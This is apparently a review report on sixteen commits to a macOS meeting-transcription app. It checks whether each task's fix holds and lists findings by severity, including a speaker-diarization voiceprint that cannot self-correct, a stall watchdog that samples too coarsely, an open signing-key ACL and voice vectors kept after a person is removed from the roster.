**SEC31 (33ec4b54): holds, and the task is genuinely done.** uv.lock resolves certifi 2026.10.23, huggingface-hub 1.33.0 under a recorded constraint, no httpx2 or truststore entry, aiohttp gone. The lock is what the installer syncs with --frozen, so the fix reaches the owner's venv only on the next install or rebuild.

**REC31 (c37261c5): holds, done.** effectiveFreeBytes treats an important-usage value of zero or less as unreadable and the Storage pane now reads through the same reader; it is the only reader of the volume keys in the daemon. The scratch ExFAT disk image probe was optional and was not run, so the assumption that available capacity reads correctly on ExFAT rests on the audit's measurement.

**REC33 (308a80a8): holds as a measurement, defect unconfirmed.** It logs system_capture_lag_sec next to head_offset_sec and leaves the merge on the delivery stamp, by the owner's decision. The tests are mostly source-text greps plus pure conversion tests; the path from the SCStream timestamp to the logged lag is not exercised end to end.

**PIPE41 (dd81f5c0): holds with gaps, done.** No loop, no double publish, and a cancelled job is not re-run: eligibility is decided in the failure branch after the cancellation check, requires full job, .auto summary mode, .pipeline stage and remedy retry, and the cancel path yields stage .interrupted. The bound is a per-stem store written to spent before retryMeeting runs and never re-armed, so a failed re-run (through either retryMeeting path) is never marked again, and a relaunch does not reset it. The pickup re-validates (failure still on disk with the recorded ts, no summary.json), which also excludes a failure after a partial publish. Gaps: the launch pass spends the one retry after a fixed 90 s with no connectivity check (finding 6); there is no backfill, so the incident stem the task was filed for still has no summary and only gets the launch notice.

**FEAT24 (97615b7e, 1da842ba): holds with gaps, done.** Every caller of roster forget was checked. The only app caller is Preferences' People Remove, which has an NSAlert confirm; Undo naming and rename in one meeting now call rosterUnenroll with this meeting's stem and label and never forget. unenroll removes a sample only by recorded (stem, label) with a per-sample fingerprint, or by vector match at cosine 0.9999 for legacy samples, never another stem's sample, and leaves the file byte-identical when nothing matches. The one design gap is rename (finding 3).

**DIAR11 (1a8b35da): holds with gaps, partial status honest.** The pick is by mic speech time with a floor and a runner-up check, a disagreeing voiceprint wins only when mic-side, enrolment needs corroboration, a mic-side cluster matching the voiceprint and the owner cluster at 0.65 is folded, a system-side one is only flagged, and owner_cluster_chosen carries evidence and no label text. Behaviour with no voiceprint, a silent owner and two people on one mic: silent owner now yields nobody (correct, previously a one-utterance cluster could be named); two people on one mic decline the mic pick and the voiceprint decides, but with no voiceprint nobody is named and nothing is enrolled (finding 1). The 15 s floor and 0.25 share are stated guesses, the replay that was supposed to set them has not run, and the field bars are unmeasured.

### Findings by severity

#### Medium

**1. DIAR11: no voiceprint plus a second mic-side cluster leaves the owner unnamed and the voiceprint unseeded.** File `pipeline/src/mp/diarize.py`, `pick_mic_speaker`.
```python
elif any(
    k != winner and mic_time.get(k, 0.0) >= runner_up_share * mic_time[winner]
    for k in candidates
):
    winner = None
```
Failure scenario: a fresh install or after VoiceprintStore.reset(), a meeting where the owner is split into a 600 s cluster and a 160 s mic-side fragment (26.7%, the field shows 14 of 107 stems with an owner split), or where a second local voice has 25% of the owner's time. The mic tier returns None, there is no voiceprint to decide, so nobody is named and `_me_signals` enrols nothing. Before the change the larger cluster was named and enrolled. If such meetings are common for this owner, the voiceprint can stall unseeded; once a voiceprint exists the fold names both fragments. Related: a short owner turn under `MIN_MIC_SPEECH_SEC = 15.0` is also unnamed without a voiceprint, and three existing test fixtures were lengthened past the floor to keep passing, which shows the floor binds on short clips. Both constants are provisional and the replay has not run.

**2. DIAR11: a stale voiceprint blocks enrolment forever.** File `pipeline/src/mp/orchestrate.py`, `_me_signals`.
```python
and (voiceprint is None or voiceprint_me == mic_me)
```
Failure scenario: the owner enrolled on the built-in mic, later uses AirPods and scores under the 0.5 voiceprint floor. The mic tier still names the owner (no disagreement because the voiceprint places nobody), but the sample is never folded in, so the print cannot adapt to the new mic and the fold and the voiceprint tier stay blind to the owner until a manual reset. Poisoning is prevented, adaptation is too (the spec asked for it; the cost is worth stating).

**3. FEAT24: rename in one meeting splits a person into two near-identical roster entries.** File `daemon/Sources/MeetingPipe/Library/MeetingLibraryService.swift`, `renameSpeaker`.
```swift
self.launcher.rosterUnenroll(name: oldName, label: label, wav: anchor) { [weak self] result in
```
Failure scenario: the owner fixes a misspelling ("Alise" to "Alice") in one meeting. The new name is enrolled with this meeting's sample, and the old name keeps every sample from other meetings. The roster now holds two people with near-identical centroids; `match_detail` requires a 0.07 margin between persons, so a later meeting with that voice matches neither and stays THEM-x until the owner renames the person from Preferences or the People rail. Before the change the old person was forgotten whole (and lost samples). The per-sample inverse is right for Undo; for rename the better inverse may be a whole-person rename when the old name has no other meeting provenance, or a prompt.

**4. PERF11: a 250 ms ping cannot see most of the stalls the 100 ms threshold is for.** File `daemon/Sources/MeetingPipe/MainThreadStallWatchdog.swift`.
```swift
interval: TimeInterval = 0.25,
thresholdMs: Double = StallDetector.logThresholdMs,
```
Failure scenario: the audit measured 30 to 342 ms stop stalls and 200 ms or more in 6 of 74 capture-file creates. A 200 ms stall is hit by a ping with probability about 80% and reported as a uniform 0 to 200 ms wait, so under half are logged, and each logged one is understated. A 20 to 50 ms interval or a run-loop observer (the audit's suggestion) would make the 100 ms threshold meaningful. The test uses `interval: 0.05, thresholdMs: 300`, so it never exercises the shipped pair.

**5. SEC17: the owner's existing signing key is still open to any application.** File `scripts/signing-key-acl.sh` (reports, cannot change).
```
The '$DEV_CERT_CN' key can be used by ANY application on this Mac without a prompt (it was imported with -A).
```
Failure scenario: until the owner runs the script and the four Keychain Access steps, the realistic exposure the task's title names (any same-user process can sign code the app's TCC grants accept) is unchanged on the machine that matters; hardened runtime only closes the DYLD route. Also unverified: the real self-signed-cert build running under hardened runtime (relocation test signs with `MEETINGPIPE_SIGN_ID=-`), and whether `sample MeetingPipe`, which PERF9, PERF11 and PERF12 owner checks rely on, still attaches to a hardened process.

#### Low

**6. PIPE41: the launch trigger can burn the one retry while offline.** File `daemon/Sources/MeetingPipe/Coordination/AutoRetry.swift`, `AutoRetryTiming.launchDelay` is 90 s and `AutoRetryPass.run` calls `store.claim` unconditionally. Failure scenario: the Mac wakes on a train, the launch pass runs 90 s later with no network, `retryMeeting` is accepted, the re-run fails at once, and the entry is spent; the next try is the owner's. The 24 h notice then covers it only at a later launch. A connectivity check or deferring to the next successful job when none has been seen would avoid it. Also: the originating incident stem has no backfill and stays unrecovered.

**7. SEC21: `strict_problem` raises on a non-string backend.** File `pipeline/src/mp/workflows.py`.
```python
if "backend" in doc and doc["backend"] not in KNOWN_BACKENDS:
```
Failure scenario: a hand-edited workflow with `backend = ["local"]` (or a `[backend]` table) makes the membership test on a frozenset raise `TypeError: unhashable type` (verified in Python), which propagates through `load_workflows` into `mp doctor` and any `nda_workflow_names` caller, instead of reporting the file as broken. Swift refuses the same file cleanly.

**8. SEC22: the person-removal control leaves the biometric vectors.** Files `pipeline/src/mp/roster_cmd.py` and `daemon/Sources/MeetingPipe/Preferences/PreferencesView+Pipeline.swift`: `launcher.rosterForget(name: person.name)` passes no purge and the dialog says only "Past transcripts are unchanged." Failure scenario: the owner removes a colleague from the roster expecting their voice data gone; every `<stem>.embeddings.json` still holds that vector under the name. Documented as an owner call in the task.

**9. DIAR11 replay instrument.** `scripts/valid1_check.py --owner-cluster` measures against the mean of owner-labelled vectors on disk by default, which is the labelling under test. Failure scenario: on a stem where the owner's name sits on the wrong cluster the reference is polluted by that cluster, so the "owner's name on a cluster under cosine 0.5" count can undercount the defect it exists to measure. The follow-up already moved away from the voiceprint reference for a different reason; the owner should know which reference the before and after tables use.

**10. Test shape (PERF30, REC33, PERF31).** The PERF30 flow test re-implements the view's derive in the test body, and the REC33 and PERF31 "does not change" pins are source-text greps. They pass if the behaviour regresses but the text is kept. Low risk for these three.

**11. DIST8 and REC31 notes.** Default uninstall still removes the logs folder; the REC31 reader fix assumes `volumeAvailableCapacity` reads correctly on ExFAT, which the optional disk-image probe would have confirmed.

### Five-line summary

1. No task failed or regressed; 11 of 16 commits hold, DIAR11, FEAT24, PIPE41, SEC17, SEC21, SEC22, PERF9, PERF11, PERF12 hold with gaps, and all four tasks marked done (SEC31, FEAT24, PIPE41, REC31) really are done for their scope.
2. Biggest gaps: PERF11 watchdog interval (250 ms ping against a 100 ms threshold) and unmeasured PERF9 acceptance; SEC17's existing -A key stays open until the owner acts.
3. DIAR11 is sound in mechanism but its 15 s floor and 25% share are unvalidated guesses, and it can leave the owner unnamed and the voiceprint unseeded when no print exists, and it blocks enrolment after a mic change.
4. FEAT24 never forgets a whole person from undo or rename (only Preferences Remove, which confirms), but rename in one meeting leaves two near-identical roster people that block each other's auto-naming; PIPE41 cannot loop, double-publish or re-run a cancelled job, but spends its one retry at a fixed 90 s after launch even when offline.
5. Smaller: SEC21 `strict_problem` raises TypeError on a list-valued backend, SEC22 leaves vectors on person removal, several tests restate implementation text.

### Addendum after the advisor's reply (DIAR11)

**12. DIAR11 (medium, possibly high on the work laptop): nothing validates, rebuilds or gates an existing voiceprint.** Files `pipeline/src/mp/orchestrate.py` (`_me_signals`) and `pipeline/src/mp/diarize.py` (`_resolve_me`, fold in `resolve_speaker_labels`). The commit does not touch `voiceprint.py` or the stored print. The disagreement rule trusts it unconditionally, and the fold uses it at 0.65 with no quality check.
```python
if mic and vp and mic != vp:
    if mic_fractions is not None and mic_fractions.get(vp, 0.0) >= min_fraction:
        return vp, "voiceprint"
```
What limits the damage: the print must still pass `match_voiceprint`'s own 0.5 floor and 0.07 margin, and the winner must be at least 0.6 mic-side, so a contaminated print cannot name a system-side cluster against the mic pick (nobody is named instead), and a contaminated print that matches nothing now blocks enrolment rather than being fed more. What it does not limit: the print is a running mean frozen at the 12-meeting cap (`store.meetings() < _VOICEPRINT_ENROLL_CAP`), and on the work laptop about a quarter of old mic picks were on a non-matching cluster (26 of 107), so by my estimate a few of its 12 samples are other people (an estimate, I did not see the print). Failure scenario: a second local voice on the owner's mic that happens to match the blended print above 0.5 now outranks the mic pick and takes the owner's name, and the fold at 0.65 can name further mic-side clusters as the owner. Because enrolment is capped, and now also needs corroboration by that same print, the print can never self-correct (it never could past the cap, now it also cannot before it). Neither the commit, the task file nor gotchas.md names this; the task's walkthrough has the owner re-finalize two stems but not reset or inspect the print. Suggested: an owner-run check of the print against the owner-labelled vectors (valid1_check already computes that mean) and a `VoiceprintStore.reset()` before re-finalizing, and the ship note should say the new preference assumes a clean print.

**Answers to the advisor's other points.** (a) Status honesty: the task header is `partial` and the comment says "Owed - the owner confirms the replay bars and runs the replay on their Mac (the 15 s floor is provisional until then)", and gotchas.md repeats that nobody replayed the pack, so nothing implies validation. (b) Floor test: `test_a_cluster_under_the_speech_floor_is_not_evidence_of_a_voice` pins the pure function (winner None below 15 s, named at exactly 15 s) but there is no test that a below-floor owner ends up unnamed or named by the voiceprint tier through `resolve_speaker_labels`; the three lengthened fixtures were existing mic-pick tests, not floor tests, so lengthening them is legitimate. (c) On finding 1, the trade-off is as the advisor says: with channel-separated capture two mic-dominant clusters with no voiceprint are more likely an over-split owner than a second person, so folding or naming both would bootstrap the print, at the cost of audit finding F096; that is an owner decision.
